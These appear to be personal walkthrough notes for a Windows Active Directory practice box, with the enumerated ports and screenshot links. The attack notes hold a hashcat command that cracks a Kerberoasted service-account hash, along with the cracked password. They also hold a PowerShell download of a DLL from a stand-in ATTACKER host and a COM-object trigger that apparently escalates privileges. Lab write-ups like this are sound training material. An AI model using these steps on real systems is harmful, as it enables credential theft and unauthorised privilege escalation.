# Access

Sanitized practice-box notes. Folder layout matches the Obsidian template: **General Info → External (per port) → Exploit → Internal / Priv Esc → Loot**, with **Evidence** next to the phase where the screenshot was taken.

| | |
| --- | --- |
| OS (guess from ports) | Windows / AD |
| Notes | Personal walkthrough, not a spoiler-free writeup |

## Layout

- [General Info](General-Info.md)
- [Exploit](Exploit.md)
- [Loot](Loot.md)
- [External](External/) — per-port enumeration
- [Internal / Priv Esc](Internal/Priv-Esc.md)

### Ports touched

- `135-RPC`
- `139-netbios-ssn`
- `3268-ldap`
- `3269-TCPwrapped`
- `389-ldap`
- `464-kpasswd`
- `49666-49799-Microsoft-Windows-RPC`
- `49673-ncacn_http`
- `53-DNS`
- `593-RPC`
- `5985-Winrm`
- `5985-http`
- `636-TCPwrapped`
- `80-http`
- `88-kerberos`
- `9389-mc-nmf`

## Attack notes

sudo hashcat -m 13100 svc_mssql.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force svc_mssql : trustno1 iwr -uri http://ATTACKER:80/Printconfig.dll -Outfile Printconfig.dll $type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}") $object = [Activator]::CreateInstance($type)

### Commands used

```bash
sudo hashcat -m 13100 svc_mssql.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
iwr -uri http://ATTACKER:80/Printconfig.dll -Outfile Printconfig.dll
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
$object = [Activator]::CreateInstance($type)
```


### References

- _(none)_

## Evidence

![Pasted image 20240727224135.png](Internal/Evidence/Pasted%20image%2020240727224135.png)

![Pasted image 20240727222619.png](Internal/Evidence/Pasted%20image%2020240727222619.png)

![Pasted image 20240727222630.png](Internal/Evidence/Pasted%20image%2020240727222630.png)

![Pasted image 20240727222420.png](Internal/Evidence/Pasted%20image%2020240727222420.png)

![Pasted image 20240727223834.png](Internal/Evidence/Pasted%20image%2020240727223834.png)

![Pasted image 20240727225259.png](Internal/Evidence/Pasted%20image%2020240727225259.png)

![Pasted image 20240727223952.png](Internal/Evidence/Pasted%20image%2020240727223952.png)

![Pasted image 20240727224146.png](Internal/Evidence/Pasted%20image%2020240727224146.png)

![Pasted image 20240727222314.png](Internal/Evidence/Pasted%20image%2020240727222314.png)

![Pasted image 20240727225646.png](Internal/Evidence/Pasted%20image%2020240727225646.png)

![Pasted image 20240727224217.png](Internal/Evidence/Pasted%20image%2020240727224217.png)

![Pasted image 20240727224015.png](Internal/Evidence/Pasted%20image%2020240727224015.png)
